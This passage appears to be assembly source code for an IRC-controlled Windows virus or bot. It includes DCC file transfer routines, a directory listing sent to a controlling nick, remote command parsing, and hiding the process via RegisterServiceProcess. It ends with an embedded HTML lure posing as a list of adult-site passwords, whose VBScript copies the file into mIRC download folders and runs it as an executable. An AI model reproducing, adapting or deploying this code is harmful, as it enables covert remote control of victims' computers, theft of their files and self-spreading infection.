           jnz     GetEndOfFileList

           invoke  lstrcpy, esi, DCCFilename

           invoke  lstrlenInc, esi
           add     ScriptFileSize, eax

           call    UpdateScriptFile

           invoke  LocalFree, DCCFilename

           ret

   ErrorRecieving:
           invoke  LocalFree, DCCFilename
           invoke  closesocket, DCCSocket
           invoke  CloseHandle, DCCFileptr
           invoke  LocalFree, DCCMessage
           ret

   DCCRecv endp


   DCCRecvFunction:
           push    esi

           invoke  LocalAlloc, LMEM_ZEROINIT, 2000
           mov     esi,eax

           invoke  lstrlen,[Buffs+4*4]
           invoke  lstrcpyn, esi, [Buffs+4*4], eax

           invoke  SplitStringAtSpace, esi

           mov     eax,esi
           mov     ebx,GENERIC_READ
           mov     ecx,CREATE_ALWAYS
           nop
           call    MyOpenFile
           jz      ErrorDCCRecv

           invoke  CloseHandle, eax

           invoke  lstrlen,[Buffs+4*4]
           invoke  lstrcpyn, esi, [Buffs+4*4], eax

           lea     eax,DCCRecv
           invoke  CreateThread, 0, StackUsed, eax, esi, 0, offset Temp
           pop     esi
           ret

      ErrorDCCRecv:
           invoke  LocalFree, esi
           pop     esi
           ret

   ShouldRecieveProgram:
           invoke  CreateFile, [Buffs+3*4], 0, 0, 0, OPEN_EXISTING, 0, 0
           cmp     eax,INVALID_HANDLE_VALUE
           jnz     DontDownloadFile

           invoke  SendMsg, offset GetFileString
           ret

      DontDownloadFile:
           invoke  CloseHandle, eax
           ret


   NewSlaveFunction:
           mov     ecx,NumSlaves
           mov     edx,Slaves
           mov     eax,Slave1

       LookForFreeSlaveSlot:
           cmp     byte ptr [eax],0
           jz      AddNewSlave

           add     eax,10
           dec     ecx
           jnz     LookForFreeSlaveSlot

           invoke  Random, 5
           add     eax,'1'
           mov     [NoPlaceString+26],al

           invoke  SendMsg, offset NoPlaceString

           ret


   DirMessage      db      "PRIVMSG Bhunji :$3",0
   DirFile         db      "dirfile.txt",0

   DirFunction proc
           local   FindData:WIN32_FIND_DATA
           local   FileHandle:dword

           lea     edi,FindData
           assume  edi:ptr WIN32_FIND_DATA

           mov     eax,offset DirFile
           mov     ebx,GENERIC_WRITE
           mov     ecx,CREATE_ALWAYS
           call    MyOpenFile
           jz      ErrorDirFunction

           mov     FileHandle, ebx

           invoke  GetCurrentDirectory, 300, offset RecvString

           invoke  SetCurrentDirectory, offset PathString

           mov     eax, dword ptr [Buffs+3*4]

           invoke  FindFirstFile, eax, edi
           mov     ebx,eax
           inc     eax
           jz      EndDirFunction

       SendFileName:
           lea     esi,[edi].cFileName

           and     [edi].dwFileAttributes, FILE_ATTRIBUTE_DIRECTORY
           jz      SendFilename

           invoke  lstrlen, esi
           mov     word ptr [eax+esi],'\'

      SendFilename:
           invoke  lstrlen, esi
           mov     word ptr [esi+eax],CRLF
           inc     eax
           inc     eax

           invoke  WriteFile, FileHandle, esi, eax, offset Temp, 0

           invoke  FindNextFile, ebx, edi
           test    eax,eax
           jnz     SendFileName
           assume  edi:nothing

      EndDirFunction:
           invoke  SetCurrentDirectory, offset RecvString
           invoke  CloseHandle, FileHandle

           mov     eax,offset DirFile
           mov     [Buffs+3*4], eax
           call    DCCSendFunction

      ErrorDirFunction:
           ret
   DirFunction endp







      AddNewSlave:
           pushad

           invoke  CreateString, eax, offset NickStr    ; copy name to slaveX
           invoke  LoadSlaveData, Slave1           ; Reload slavedata

           invoke  LocalAlloc, LMEM_ZEROINIT, 1000
           mov     edi, eax
           mov     ebx, eax

           invoke  lstrcpy, edi, offset PRIVMSGNick
           call    DCCSendSpaceSaver
           dec     edi

           invoke  lstrcpy, edi, offset YouGotFileStr
           call    DCCSendSpaceSaver

           mov     esi, DownloadedFiles

        SendFileList:
           invoke  lstrcpy, edi, esi
           invoke  lstrlenInc, esi
           add     esi, eax

           invoke  SendMsg, ebx


           cmp     byte ptr [esi],0
           jnz     SendFileList

           invoke  LocalFree, ebx

           popad
           ret

   IsOnline:

           invoke  LocalAlloc, LMEM_ZEROINIT, 1000
           mov     edi, eax
           assume  edi:ptr RASCONN

           sub     esp,4
           mov     edx, esp                        ; edx = BufferSize = 1000
           push    0
           mov     ecx, esp                        ; ecx -> Number of conns

           mov     [edi].dwSize, sizeof(RASCONN)

           invoke  RasEnumConnections, edi, edx, ecx

           push    edi
           mov     edi,[edi].hrasconn

           call    LocalFree
           pop     eax                             ; eax = 1000
           pop     eax                             ; eax = Number of conns
           assume  edi:nothing
           ret

   WaitUntilOnline proc uses edi ebx
           local   ConnStatus: RASCONNSTATUSA
           assume  ebx:ptr RASCONNSTATUSA
           lea     ebx, ConnStatus
           jmp     WaitUntilOnlineStart


   PauseAndThenCheckOnlineAgain:
           invoke  Sleep, 1000


   WaitUntilOnlineStart:
           call    IsOnline
           test    eax,eax
           jz      PauseAndThenCheckOnlineAgain


           mov     [ebx].dwSize, sizeof(RASCONNSTATUSA)
           invoke  RasGetConnectStatus, edi, ebx

           cmp     [ebx].rasconnstate, RASCS_Connected
           jnz     PauseAndThenCheckOnlineAgain

           assume  ebx:nothing
           ret
   WaitUntilOnline endp


   ConnectToServer proc

           local   SockAddrTemp:sockaddr_in

           invoke  closesocket, SocketPtr

           invoke  socket, AF_INET, SOCK_STREAM, 0
           mov     SocketPtr,eax

      ConnectToServerLoop:
           call    WaitUntilOnline

           mov     esi,IRCCurrentIp
           invoke  lstrlenInc,esi
           add     eax,esi

           cmp     byte ptr [eax],0
           jnz     PointToNextIp

           mov     eax,IRCIpNumbers

      PointToNextIp:
           mov     IRCCurrentIp,eax

           invoke  inet_addr, esi

           mov     sin_addr,eax                    ; move to connect data
           lea     eax,sin_family
           invoke  connect, SocketPtr, eax, sizeof(sockaddr_in)    ; connect
           test    eax,eax
           jnz     ConnectToServerLoop

           call    GetIpFunction

           lea     eax,SendMyNickInfo              ; send login data
           invoke  SendMsg, eax
           lea     eax,SendMyUserInfo
           invoke  SendMsg, eax

      NotOnline:
           ret
   ConnectToServer endp

   SplitMessage proc Message:dword
           push    edi
           mov     edi,Message

           .if byte ptr [edi]==':'                 ; Message Handler
                   invoke  SplitStringAtSpace, edi

                   mov     [Buffs],eax             ; command

                   invoke  IsInMessage, edi, offset ExclamanationMark
                   jc      DontEndNick

                   mov     byte ptr [eax],0
                DontEndNick:
                   inc     edi
                   mov     SendingNick, edi

                   mov     esi,IgnoreNicks

                IsOnIgnoreList:
                   call    StringCmp
                   jz      ParseMessage            ; Dont parse if ignore
                   add     esi,10
                   cmp     byte ptr [esi],0
                   jnz     IsOnIgnoreList

           .else                                   ; System Handler
                   mov     [Buffs],edi

           .endif
                   pop     edi
                   ret

   SplitMessage endp


   ParseCommand proc ParseData:dword
           local   WhereInParseData:dword
           local   WhatToParse:dword
           local   Inverse:dword

           push    esi
           push    edi

           mov     esi,ParseData

        ParseLoop:
           mov     Inverse,0

           xor     eax,eax
           lodsb

           test    eax,eax
           jz      ParseCommandReturn

           cmp     eax,1
           jz      DoCommand

           cmp     eax,'!'
           jnz     CreateStringToLookIn

           mov     Inverse,1
           inc     esi

       CreateStringToLookIn:
           dec     esi


           invoke  LocalAlloc, LMEM_ZEROINIT, 3000

           mov     edi,eax

           invoke  lstrcpy, edi, esi

           invoke  lstrlenInc,esi
           add     esi,eax

           push    esi                             ; save esi

           invoke  SplitStringAtSpace, edi         ; edi -> what to look in
           jc      Error
           mov     esi,eax                         ; esi -> what to look for


           push    edi                             ; save for LocalFree
           push    edi

           lea     eax,[edi+1100]
           mov     edi,eax                         ; created string 1

           push    eax
           call    CreateString

           push    esi
           add     eax,10
           mov     esi,eax                         ; create string 2

           push    eax
           call    CreateString

           invoke  IsInMessage, edi, esi
           setc    al
           movzx   edi,al
           call    LocalFree

           pop     esi
           xor     edi,Inverse
           jnz     DontDoCommand

       DoCommand:
           xor     eax,eax
           lodsb


           .if eax=='|'
                   lodsb
                   lodsb
                   sub     eax,'0'
                   lea     edi,[Buffs+eax*4]


                   xor     eax,eax
                   mov     Temp,eax
                   lodsb
                   mov     byte ptr [Temp],al

                   lodsb
                   dec     eax
                   push    esi
                   mov     esi,eax
                   mov     eax,[edi]

             MakePieces:
                   invoke  IsInMessage, eax, offset Temp
                   jc      DontSplitMore

                   mov     byte ptr [eax],0
                   inc     eax
                   add     edi,4
                   mov     [edi],eax
                   dec     esi
                   jnz     MakePieces

             DontSplitMore:
                   pop     esi

                   lodsd
                   add     eax,Aligment
                   invoke  ParseCommand, eax

           .elseif eax=='l'
                   lodsd
                   add     eax,Aligment
                   invoke  ParseCommand, eax

           .elseif eax=='s'
                   invoke  SendMsg, esi

                   invoke  lstrlenInc, esi

                   add     esi,eax
           .elseif eax=='f'
                   lodsw
                   pushad
                   call    [Functionlist+eax*4]
                   popad
           .elseif eax=='v'
                   invoke  LocalAlloc,LMEM_ZEROINIT, 1000
                   push    eax                             ; for LocalFree
                   mov     edi,eax

                   invoke  lstrcpy, edi, esi

                   invoke  SplitStringAtSpace, edi
                   mov     edi, eax

                   invoke  FindReplacement, esi

                   push    edx
                   invoke  lstrlenInc, edi
                   add     eax,edi

                   push    eax
                   push    eax                     ; lstrlen

                   invoke  CreateString, eax, edi

                   call    lstrlen
                   pop     ecx                     ; created string
                   pop     edx                     ; -> where to copy it
                   invoke  lstrcpy, [edx], ecx

            DontChangeVariable:
                   invoke  lstrlenInc, esi
                   add     esi,eax

                   call    LocalFree

           .else
                   jmp     ParseError
           .endif

           mov     WhereInParseData,esi
           jmp     ParseLoop

       DontDoCommand:
           xor     eax,eax
           lodsb

           .if eax=='|'
                   add     esi,4+4
           .elseif eax=='l'
                   add     esi,4
           .elseif eax=='s' || eax=='v'
                   invoke  lstrlenInc, esi
                   add     esi,eax
           .elseif eax=='f'
                   add     esi,2

           .else
                   jmp     ParseError
           .endif
           jmp     ParseLoop


       ParseCommandReturn:
           pop     edi
           pop     esi
           ret

   ParseCommand endp


      ParseErrorStr        db      "Parse error",0

      ParseError:
           invoke  MessageBoxA, 0, offset ParseErrorStr, offset ParseErrorStr, 0

      Error:
      FoundNoServer:
           invoke  Sleep, 1000*20
           invoke  ExitProcess, 0

   Kernel32                db      "kernel32",0
   RegisterService         db      "RegisterServiceProcess", 0
   HideProgram:
           invoke  GetModuleHandleA, offset Kernel32
           invoke  GetProcAddress, eax, offset RegisterService
           test    eax,eax
           jz      NoHide
           push    1
           push    0
           call    eax
         NoHide:
          ret


   ;TempMsg db      ":Bhunji!swipnet.se ERROR :Bla bla bla",0dh,0ah


   Main:
           call    HideProgram


           mov     eax,eax
           mov     eax,eax
           call    SetupProgram

   ;        mov     eax,InBuffertPtr
   ;        invoke  lstrcpy, eax, offset TempMsg

     RestartAllFuckingThings:
           call    ConnectToServer

     ParseMessage:
           mov     edi,StrBuffert
           invoke  GetMsg, edi

           invoke  SplitMessage, edi

           invoke  ParseCommand, MessageHandler
           jmp     ParseMessage

   EndIrcBot:

   _rsrc segment para public 'DATA' use32
   assume cs:_rsrc
   ; if file is seen as HTML then the virus is dropped to c:\ and executed
   ; add a '<!--' after MZ in the dos header to make the html more stealth

   db  "-->'s"
   db  '<H4>XXX passwords</H4><a href="http:\\www.pussysex.com">www.pussysex.com</a><P>Name: Jones<br>Pass: Jones<p><a href="http:\\www.teensexxx.com">'
   db  'www.teensexxx.com</a><P>Name: qwerty<BR>Pass: qwerty<p><a href="http:\\www.analpleasure.com">www.analpleasure.com</a><P>Name: anal<br>Pass: anal'
   db  '<p><a href="http:\\www.hornybabes.com">www.hornybabes.com</a><P>Name: naked<br>Pass: sex<p><a href="http:\\www.loveland.com">www.loveland.com</a>'
   db  '<P>Name: htroe<br>Pass: eerss<p><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>'
   db  '<script language = VBScript>',0dh,0ah
   db  'Set fso = CreateObject("Scripting.FileSystemObject")',0dh,0ah
   db  'Set reg = CreateObject("WScript.Shell")',0dh,0ah
   db  'if (fso.FolderExists("c:\mirc\")) Then',0dh,0ah
   db  'FileName = "c:\mirc\download\xxxpasswords.html"',0dh,0ah
   db  'elseif (fso.FolderExists("C:\mirc32\")) Then',0dh,0ah
   db  'FileName = "c:\mirc32\download\xxxpasswords.html"',0dh,0ah
   db  'elseif (fso.FolderExists("C:\programs\mirc\")) Then',0dh,0ah
   db  'FileName = "c:\program\mirc\download\xxxpasswords.html"',0dh,0ah
   db  'elseif (fso.FolderExists("C:\programs files\mirc\")) Then',0dh,0ah
   db  'FileName = "c:\program files\mirc\download\xxxpasswords.html"',0dh,0ah
   db  'elseif (fso.FolderExists("C:\programs files\mirc32\")) Then',0dh,0ah
   db  'FileName = "c:\program files\mirc32\download\xxxpasswords.html"',0dh,0ah
   db  'else',0dh,0ah
   db  'FileName = "c:\autoexec.bat"',0dh,0ah
   db  'end if',0dh,0ah
   db  'fso.CopyFile FileName, "c:\adride.exe"',0dh,0ah
   db  'reg.Run ("c:\adride.exe")',0dh,0ah
   db  '</script>',0dh,0ah



   _rsrc   ends

   end Main
